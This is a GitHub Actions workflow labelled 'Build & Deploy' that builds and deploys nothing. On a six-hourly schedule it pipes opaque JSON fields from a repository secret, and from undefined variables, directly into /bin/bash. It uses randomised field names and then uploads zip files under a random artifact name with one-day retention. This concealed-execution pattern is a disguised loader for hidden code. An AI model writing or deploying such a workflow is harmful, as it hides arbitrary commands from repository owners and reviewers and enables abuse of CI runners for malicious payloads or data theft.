name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '13 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Invoke
        env:
          x1: ${{ secrets.x1 }}
        run: |
          printf '%s' "$x1" | jq -r .byooq455 | /bin/bash
          printf '%s' "$tfk91347" | jq -r .jzys362 | /bin/bash
          printf '%s' "$r358" | jq -r .y645 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 0vo2TcNf
          path: "*.zip"
          retention-days: 1
